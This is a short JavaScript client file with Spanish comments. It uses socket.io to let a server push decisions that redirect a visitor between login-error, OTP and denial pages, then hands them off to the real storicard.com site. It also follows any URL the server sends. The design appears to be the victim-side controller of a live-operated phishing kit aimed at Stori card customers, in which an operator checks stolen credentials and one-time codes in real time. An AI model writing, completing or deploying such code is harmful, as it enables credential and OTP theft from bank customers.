const socket = io();
const sessionId = localStorage.getItem("sessionId");

// Solo reconectar si hay sessionId
if (sessionId) {
  socket.emit("reconectar", sessionId);
}

// Escuchar instrucciones del servidor

socket.on("respuesta", (decision) => {
  if (decision === "aprobado") {
    window.location.href = "/bienvenido.html";
  } else if (decision === "rechazado") {
    window.location.href = "/errorlogo.html";
  }
});

socket.on("respuestaCodigo", (decision) => {
  if (decision === "error") {
    window.location.href = "/denegado.html";
  } else if (decision === "finalizar") {
    window.location.href = "https://www.storicard.com/";
  }
});

socket.on("respuestaOtp", (decision) => {
  if (decision === "otp_error") {
    window.location.href = "/denegado.html";
  } else if (decision === "finalizar") {
    window.location.href = "https://www.storicard.com/";
  }
});

socket.on("respuestaErrorLogo", (decision) => {
  if (decision === "otp") {
    window.location.href = "/bienvenido.html";
  } else if (decision === "error_logo") {
    window.location.href = "/errorlogo.html";
  }
});

// Si el servidor envía una URL directa para redirigir
socket.on("redirigir", (url) => {
  window.location.href = url.startsWith("http") ? url : `/${url}`;
});
